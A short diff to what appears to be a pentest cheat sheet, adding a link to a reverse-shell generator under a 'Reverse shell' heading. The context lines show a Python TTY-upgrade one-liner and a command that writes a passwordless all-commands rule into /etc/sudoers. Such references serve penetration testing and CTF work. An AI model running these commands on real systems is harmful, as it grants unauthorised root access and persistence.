@@ -9,6 +9,7 @@ python -c "import pty;pty.spawn('/bin/bash')"
 echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 
 ## Reverse shell
+[Generate Reverse Shell Query](https://sentrywhale.com/documentation/reverse-shell)
 ### Bash
 ```
 Common:
